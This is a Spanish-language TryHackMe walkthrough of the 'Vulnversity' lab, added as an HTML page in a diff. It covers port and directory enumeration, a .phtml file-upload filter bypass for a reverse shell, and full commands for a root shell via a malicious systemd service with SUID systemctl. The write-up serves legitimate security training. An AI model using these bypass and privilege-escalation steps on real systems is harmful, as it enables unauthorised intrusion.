@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=7afa1facc940fff5b3c07e413a43d6edca9053dc">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnversity | Portfolio de @juanma-cc</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Vulnversity" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad." />
+<meta property="og:description" content="Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/thm-writeups/thm_vulnversity.html" />
+<meta property="og:url" content="http://localhost:4000/thm-writeups/thm_vulnversity.html" />
+<meta property="og:site_name" content="Portfolio de @juanma-cc" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnversity" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad.","headline":"Vulnversity","url":"http://localhost:4000/thm-writeups/thm_vulnversity.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Portfolio de @juanma-cc</h1>
+        </a>
+        <h2>Este es mi portfolio personal donde recopilo proyectos y conocimientos sobre ciberseguridad.</h2>
+
+        <section id="downloads">
+          
+          
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        
+<h1 id="vulnversity">Vulnversity</h1>
+<p><img src="../images/vulnbox.png" alt="VulnbersityBox" width="250" /></p>
+
+<p><strong>Plataforma:</strong> <code class="language-plaintext highlighter-rouge">TryHackMe</code></p>
+
+<p><strong>Sistema Operativo:</strong> <code class="language-plaintext highlighter-rouge">Linux</code></p>
+
+<p><strong>Dificultad:</strong> <code class="language-plaintext highlighter-rouge">Easy</code></p>
+
+<p><strong>IP:</strong> <code class="language-plaintext highlighter-rouge">10.10.225.1</code></p>
+
+<p><strong>Autor writeup:</strong> <code class="language-plaintext highlighter-rouge">juanma-cc</code></p>
+
+<p><strong>Perfil de TryHackMe:</strong> <a href="https://tryhackme.com/p/juanmacc">juanmacc</a></p>
+
+<p><strong>Fecha:</strong> <code class="language-plaintext highlighter-rouge">25-05-2025</code></p>
+
+<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=4616237" style="border:none;" frameborder="0" width="350" height="100"></iframe>
+
+<hr />
+<h2 id="-resumen-rápido">📖 Resumen rápido</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Esta máquina se explota mediante una vulnerabilidad de subida de archivos mal configurada 
+en una página web interna, permitiendo la ejecución remota de código a través de una reverse shell. 
+La escalada de privilegios se logra aprovechando un binario con permisos SUID para obtener acceso root.
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-enumeración">🔍 Enumeración</h2>
+
+<ul>
+  <li>Comenzamos la enumeración de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code></li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.225.1
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host is up, received conn-refused <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2025-05-25 21:55:35 CEST <span class="k">for </span>23s
+Not shown: 994 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE     REASON  VERSION
+21/tcp   open  ftp         syn-ack vsftpd 3.0.3
+22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3128/tcp open  http-proxy  syn-ack Squid http proxy 3.5.12
+3333/tcp open  http        syn-ack Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+Service Info: Host: VULNUNIVERSITY<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>✅ El puerto más interesante es el <code class="language-plaintext highlighter-rouge">3333</code>, donde corre un servidor web Apache.</p>
+
+<h3 id="descubrimiento-web">Descubrimiento Web</h3>
+
+<p>Accedemos al sitio web en:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://10.10.225.1:3333</code></p>
+
+<p>No encontramos contenido relevante directamente, por lo que procedemos a enumerar directorios ocultos.</p>
+
+<h3 id="enumeración-de-subdominios">Enumeración de subdominios</h3>
+
+<p>Utilizaremos <strong>gobuster</strong> para descubrir nuevos subdominios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.225.1:3333 <span class="nt">-w</span> /ruta/wordlist.txt
+</code></pre></div></div>
+
+<p><img src="../images/Vulnversity.png" alt="vuln" /></p>
+
+<p>Tras el escaneo, vemos un subdominio interesante: <strong>internal</strong>
+Al acceder nos encontramos con esta página, que nos permite subir archivos.</p>
+
+<p><img src="../images/Vulnversity2.png" alt="vuln2" /></p>
+
+<hr />
+<h2 id="-explotación">💥 Explotación</h2>
+
+<p>Al intentar subir cualquier archivo, por ejemplo en .php nos encontramos que salta un error.</p>
+
+<p>⛔ <code class="language-plaintext highlighter-rouge">[ERROR]</code> ⛔
+    No acepta archivos con extensión <strong>.php</strong>
+⛔ <code class="language-plaintext highlighter-rouge">[ERROR]</code> ⛔</p>
+
+<p>Para ver que tipo de archivos acepta, podemos crear una wordlist con extensiones comunes de <strong>.php</strong> como por ejemplo:</p>
+
+<ul>
+  <li>.php</li>
+  <li>.php3</li>
+  <li>.php4</li>
+  <li>.php5</li>
+  <li>.phtml</li>
+</ul>
+
+<p>ℹ️ <code class="language-plaintext highlighter-rouge">También podemos utilizar una wordlist con diferentes extensiones.</code></p>
+
+<p>Capturamos el intento de subida de archivo con el proxu de Burpsuite y lo mandamos a intruder. 
+En <code class="language-plaintext highlighter-rouge">filename="test.php"</code> , modificamos el <code class="language-plaintext highlighter-rouge">.php</code> presionando el botón de “Add &amp;”.
+Esto hará que modifique la extensión con nuestro payload.</p>
+
+<p><img src="../images/Vulnversity3.png" alt="Vulrnversity3.png" /></p>
+
+<p>Solo nos queda observar las diferentes requests para ver la respuesta. 
+Si filtramos por <code class="language-plaintext highlighter-rouge">Success</code> vemos que una petición ha llegado correctamente.</p>
+
+<p>👌👌👌 Lo tenemos! 👌👌👌</p>
+
+<p>Admite extensiones <code class="language-plaintext highlighter-rouge">.phtml</code></p>
+
+<p><img src="../images/Vulnversity4.png" alt="Vulrnversity4.png" /></p>
+
+<p>Subimos una reverse shell en .php pero modificando la extensión a <code class="language-plaintext highlighter-rouge">.phtml</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">ℹ️ Nuestra querida reverse de PentestMonkey es suficiente 😈</code></p>
+
+<p>Escuchamos con <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code></p>
+
+<p><img src="../images/Vulnversity5.png" alt="Vulrnversity5.png" /></p>
+
+<p>Ejecutamos la reverse shell a través de la siguiente dirección:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://10.10.225.1:3333/internal/uploads/reverse.phtml</code></p>
+
+<p>Ya podemos movernos libremente para encontrar al user 😏
+Vamos a <code class="language-plaintext highlighter-rouge">/home/</code> y ya tendremos  la flag de user</p>
+
+<p><img src="../images/Vulnversity1.png" alt="Vulrnversity1.png" /></p>
+
+<hr />
+
+<h2 id="-escalada-de-privilegios">🦸 Escalada de Privilegios</h2>
+
+<p>Buscamos todos los archivos con permisos <code class="language-plaintext highlighter-rouge">SUID</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Tras revisar la lista y buscar algo de información, este es el análisis y la explicación:</p>
+<h3 id="-qué-es-un-binario-suid">🔍 ¿Qué es un binario SUID?</h3>
+
+<p>Un binario con el <strong>bit SUID activado</strong> se ejecuta <strong>con los privilegios del dueño del archivo</strong> , normalmente <strong>root</strong> , aunque lo ejecute un usuario normal.</p>
+
+<p>Esto puede ser peligroso si:</p>
+
+<ul>
+  <li>El binario permite ejecutar comandos o leer/abrir archivos arbitrarios.</li>
+  <li>Se puede explotar para elevar privilegios.</li>
+</ul>
+
+<p>Lista de archivos interesantes que nos encontramos:</p>
+
+<ul>
+  <li>/bin/su</li>
+  <li>/bin/ntfs-3g</li>
+  <li>/bin/mount</li>
+  <li>/bin/ping6</li>
+  <li>/bin/umount</li>
+  <li>/bin/systemctl</li>
+  <li>/bin/ping</li>
+  <li>/bin/fusermount</li>
+  <li>/sbin/mount.cifs</li>
+</ul>
+
+<h3 id="-binarios-comunes-y-seguros-no-vulnerables">✅ Binarios comunes y seguros (NO VULNERABLES):</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Ruta</th>
+      <th>Descripción</th>
+      <th>¿Peligroso?</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/bin/su</code></td>
+      <td>Cambio de usuario</td>
+      <td>No. Es seguro, no hay exploits conocidos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/bin/ping</code>y<code class="language-plaintext highlighter-rouge">/bin/ping6</code></td>
+      <td>Herramienta de red</td>
+      <td>No. Necesita SUID para funcionar, pero no permite explotación.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/bin/mount</code>y<code class="language-plaintext highlighter-rouge">/bin/umount</code></td>
+      <td>Montar/desmontar dispositivos</td>
+      <td>Requiere configuración específica, difícil de explotar.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/bin/fusermount</code></td>
+      <td>Usado por FUSE</td>
+      <td>Seguro en entornos normales.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/sbin/mount.cifs</code></td>
+      <td>Montar sistemas de archivos CIFS</td>
+      <td>Similar a mount, no explotable fácilmente.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="️-potencialmente-vulnerable">⚠️ Potencialmente vulnerable:</h3>
+
+<h4 id="-binsystemctl">🤯 <code class="language-plaintext highlighter-rouge">/bin/systemctl</code></h4>
+
+<p>Este <strong>sí es interesante</strong> y muy común encontrarlo en máquinas de TryHackMe/CyberSec labs.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">systemctl</code> es una herramienta que <strong>controla el sistema init</strong> (<code class="language-plaintext highlighter-rouge">systemd</code>) y <strong>requiere privilegios root</strong> .</li>
+  <li>Si puedes ejecutar <code class="language-plaintext highlighter-rouge">systemctl</code> con SUID, puedes <strong>intentar crear un servicio malicioso</strong> y ejecutarlo como root.</li>
+</ul>
+
+<p>Con lo cual, podemos crear un servicio falso para habilitarlo y obtener una shell de root.</p>
+
+<h2 id="-cómo-explotar-binsystemctl-con-suid">🧠 ¿Cómo explotar <code class="language-plaintext highlighter-rouge">/bin/systemctl</code> con SUID?</h2>
+
+<p>Si puedes ejecutar <code class="language-plaintext highlighter-rouge">systemctl</code> como root sin ser root, podrías crear un servicio que lance una shell o te dé acceso root.</p>
+
+<h3 id="pasos-básicos">Pasos básicos:</h3>
+
+<ol>
+  <li><strong>Crear un servicio malicioso</strong> en tu directorio temporal:</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+<span class="nb">cat</span> <span class="o">&gt;</span> rootshell.service <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
+</span><span class="no">EOF
+</span></code></pre></div></div>
+
+<ol>
+  <li><strong>Ejecutar el servicio con systemctl (como root)</strong> :</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/systemctl <span class="nb">link</span> /tmp/rootshell.service
+/bin/systemctl start /tmp/rootshell.service
+</code></pre></div></div>
+
+<ol>
+  <li><strong>Ejecutar la bash con privilegios SUID</strong> :</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/rootbash <span class="nt">-p</span>
+</code></pre></div></div>
+
+<p>Al ingresar el comando, obtenemos una shell de <em>root</em>. 
+Solo falta navegar al directorio para encontrar la flag en <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+
+<hr />
+<h2 id="-conclusión">🎯 Conclusión</h2>
+
+<p>La máquina <strong>Vulnversity</strong> es una excelente introducción a:</p>
+
+<ul>
+  <li>Enumeración web básica</li>
+  <li>ByPass de filtros de subida de archivos</li>
+  <li>Uso de SUID para escalada de privilegios</li>
+</ul>
+
+      </section>
+    </div>
+  </body>
+</html>
